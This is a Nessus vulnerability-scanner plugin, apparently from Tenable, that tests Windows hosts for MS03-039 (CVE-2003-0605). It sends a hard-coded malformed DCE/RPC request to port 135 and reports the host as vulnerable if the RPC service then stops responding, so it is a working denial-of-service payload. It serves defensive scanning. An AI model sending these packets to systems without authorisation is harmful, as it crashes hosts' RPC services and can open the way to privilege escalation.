#
# (C) Tenable Network Security, Inc.
#

# Original exploit from xfocus.org
# Workaround by Michael Scheidell from SECNAP Network Security

include("compat.inc");

if (description)
{
 script_id(11798);
 script_version("$Revision: 1.41 $");
 script_cvs_date("$Date: 2016/10/10 15:57:04 $");

 script_cve_id("CVE-2003-0605");
 script_bugtraq_id(8234, 8460);
 script_osvdb_id(11460);
 script_xref(name:"MSFT", value:"MS03-039");

 script_name(english:"MS03-039: Microsoft Windows RPC DCOM Interface epmapper Pipe Hijack Local Privilege Escalation (824146) (intrusive check)");
 script_summary(english:"Remotely close port 135");

 script_set_attribute(attribute:"synopsis", value:
"The remote Windows host has a denial of service vulnerability that may
lead to privilege escalation.");
 script_set_attribute(attribute:"description", value:
"It is possible to disable the remote RPC DOM interface by sending it a
malformed request. The system will need to be rebooted to recover. A
remote attacker could exploit this flaw to remotely disable RPC-
related programs on this host.

If a denial of service attack is successful, a local attacker could
escalate privileges by hijacking the epmapper pipe.");
 # https://web.archive.org/web/20051104180919/http://archives.neohapsis.com/archives/bugtraq/2003-07/0255.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5a98a71a");
 script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms03-039");
 script_set_attribute(attribute:"solution", value:
"Microsoft has released a set of patches for Windows NT, 2000, XP, and
2003.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/07/20");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/07/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
 script_end_attributes();

 script_category(ACT_KILL_HOST); # Crashes everything com-related
 script_family(english:"Windows");

 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_require_keys("Settings/ParanoidReport");
 script_require_ports(135);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if(!get_port_state(135))exit(0);

bindstr = raw_string(0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00);
request = raw_string(0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00);


soc = open_sock_tcp(135);
if(!soc)exit(0);
send(socket:soc, data:bindstr);
r = recv(socket:soc, length:60);
send(socket:soc, data:request);
r = recv(socket:soc, length:60);
close(soc);
sleep(1);
soc = open_sock_tcp(135);
if(!soc)security_hole(135);
